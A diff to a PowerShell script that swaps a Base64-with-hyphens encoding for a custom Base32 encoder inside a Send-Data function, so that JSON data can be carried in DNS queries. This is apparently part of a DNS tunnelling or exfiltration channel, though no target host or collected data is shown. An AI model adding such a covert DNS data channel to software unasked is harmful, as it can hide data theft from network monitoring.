@@ -1,18 +1,38 @@
-function AppendHyphenToUppercaseLetters() {
-    param (
-        [string]$inputString
-    )
-    $outputString = ""
+$base32Characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
+$paddingChar = '='
 
-    foreach ($character in $inputString.ToCharArray()) {
-        if ([char]::IsUpper($character)) {
-            $outputString += "-" + $character
-        } else {
-            $outputString += $character
+function ConvertTo-Base32 {
+    param (
+        [Parameter(Mandatory = $true, Position = 0)]
+        [String]$inputString
+    )
+
+    $output = ''
+    $byteCount = 0
+    $buffer = 0
+
+    foreach ($char in $inputString.ToCharArray()) {
+        $buffer = ($buffer * 256 + [byte]$char)
+        $byteCount += 8
+
+        while ($byteCount -ge 5) {
+            $byteCount -= 5
+            $index = [math]::Floor($buffer / [math]::Pow(2, $byteCount))
+            $output += $base32Characters[$index]
+            $buffer = $buffer % [math]::Pow(2, $byteCount)
         }
     }
 
-    return $outputString
+    if ($byteCount -gt 0) {
+        $buffer *= [math]::Pow(2, 5 - $byteCount)
+        $output += $base32Characters[$buffer]
+    }
+
+    # Add padding if needed
+    $paddingLength = (8 - ($output.Length % 8)) % 8
+    $output += $paddingChar * $paddingLength
+
+    $output
 }
 
 function Send-Data {
@@ -33,16 +53,8 @@ function Send-Data {
 
     $json = $data | ConvertTo-Json
     
-    # Encode data as Base64
-    $encodedData = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($json))
-
-    # This step is neccessary, because some DNS servers change the case of the letters randomly, so it doens't get cached
-    # This is called "0x20 encoding"
-    # - https://www.theregister.com/2023/01/19/google_dns_queries/
-    # - https://astrolavos.gatech.edu/articles/increased_dns_resistance.pdf
-    #
-    # Add hyphen in front of every upper case letter
-    $encodedData = AppendHyphenToUppercaseLetters $encodedData 
+    # Encode data as Base32
+    $encodedData = ConvertTo-Base32 ($json)
 
     # Replace padding characters with _ so it can be transmitted over DNS
     $encodedData = $encodedData.Replace("=", "_")
